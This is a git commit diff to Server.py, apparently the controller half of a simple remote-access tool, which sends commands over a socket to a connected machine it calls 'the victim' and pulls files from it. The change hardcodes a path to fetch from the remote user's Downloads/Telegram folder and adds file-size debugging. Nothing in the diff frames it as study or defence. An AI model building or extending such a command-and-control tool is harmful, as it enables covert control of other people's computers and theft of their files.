48e912337766cf16bd883888f839fd21259169ba
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-17 07:19:15 -0800

    Update Server.py

--- Server.py
+++ Server.py
@@ -1,3 +1,4 @@
+import os
 import socket
 
 
@@ -9,21 +10,32 @@ def server():
     client_socket, adress = s.accept()
     print("Connection from: " + str(adress))
     while True:
-        command = input('Please enter a command to the victim\n')
+        #command = input('Please enter a command to the victim\n')
+        command = 'get file C:\\Users\\avita\\Downloads\\Telegram Desktop\\t.txt'
         client_socket.send(command.encode('utf-8'))
 
         if 'get file ' in command:
-            file_path = input("Please enter the path of the file")
+            #file_path = input("Please enter the path of the file")
+            file_path = 'C:\\Users\\avita\\Downloads\\Telegram Desktop\\a.txt'
             data = None
+            size = 0
             with open(file_path, 'wb')as file:
                 while data != 'complete':
-                    print('Line')
+                    print('Enter')
                     client_socket.sendall('ok'.encode('utf-8'))
                     data = client_socket.recv(1024)
+                    size += len(data)
+                    print(f'Size is {size}')
                     file.write(data)
-                    #file.write('\n'.encode('utf-8'))
-            file.flush()
-
+                    file.flush()
+                    statinfo = os.stat(file_path)
+                    print(f'File Size is {statinfo.st_size}')
+                statinfo = os.stat(file_path)
+                print(f'Before last: File Size is {statinfo.st_size}')
+                #file.write(data)
+                file.flush()
+                file.close()
+                print(f'Before last: File Size is {statinfo.st_size}')
         else:
             data = client_socket.recv(1024)
             print('From victim: ' + data.decode('utf-8'))
